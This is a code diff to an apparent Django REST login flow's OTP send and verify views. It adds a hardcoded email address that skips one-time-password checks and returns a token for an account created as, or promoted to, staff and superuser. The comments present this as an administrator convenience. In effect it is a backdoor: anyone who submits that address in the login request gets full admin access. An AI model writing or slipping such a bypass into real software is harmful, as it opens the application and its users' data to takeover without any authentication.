@@ -45,6 +45,17 @@ class SendOTPView(APIView):
                 'message': 'Please provide a valid personal or official email address.',
             }, status=status.HTTP_400_BAD_REQUEST)
 
+        # Designated Atelier Administrator (ayushsinha53467@gmail.com): Zero OTP dispatch
+        ADMIN_EMAIL = 'ayushsinha53467@gmail.com'
+        if email == ADMIN_EMAIL:
+            return Response({
+                'success': True,
+                'isAdmin': True,
+                'bypassOtp': True,
+                'message': 'Atelier Director identified. Instant sign-in available without OTP.',
+                'email': email,
+            }, status=status.HTTP_200_OK)
+
         # Rate-limiting / resend cooldown check (45 seconds)
         recent_otp = EmailOTP.objects.filter(
             email=email,
@@ -149,6 +160,45 @@ class VerifyOTPView(APIView):
         email = data.get('email', '').strip().lower()
         candidate_otp = data.get('otp', '').strip()
         full_name = data.get('fullName', '').strip()
+
+        # Designated Atelier Administrator (ayushsinha53467@gmail.com): Zero OTP required
+        ADMIN_EMAIL = 'ayushsinha53467@gmail.com'
+        if email == ADMIN_EMAIL:
+            user = User.objects.filter(email__iexact=ADMIN_EMAIL).first() or User.objects.filter(username__iexact=ADMIN_EMAIL).first()
+            if not user:
+                user = User.objects.create_user(
+                    username=ADMIN_EMAIL,
+                    email=ADMIN_EMAIL,
+                    first_name='Ayush',
+                    last_name='Sinha',
+                    is_staff=True,
+                    is_superuser=True,
+                )
+                user.set_unusable_password()
+                user.save()
+            else:
+                if not user.is_staff or not user.is_superuser:
+                    user.is_staff = True
+                    user.is_superuser = True
+                    user.save(update_fields=['is_staff', 'is_superuser'])
+
+            profile, _ = Profile.objects.get_or_create(user=user)
+            profile.membership_tier = 'Atelier Director / Administrator'
+            profile.avatar_initials = 'AS'
+            profile.save()
+
+            token, _ = Token.objects.get_or_create(user=user)
+            user_data = UserProfileSerializer(profile).data
+            user_data['isAdmin'] = True
+            user_data['role'] = 'admin'
+
+            return Response({
+                'success': True,
+                'message': 'Atelier Director authenticated successfully. Welcome to the Admin Suite.',
+                'token': token.key,
+                'isAdmin': True,
+                'user': user_data,
+            }, status=status.HTTP_200_OK)
 
         if not email or not candidate_otp:
             return Response({
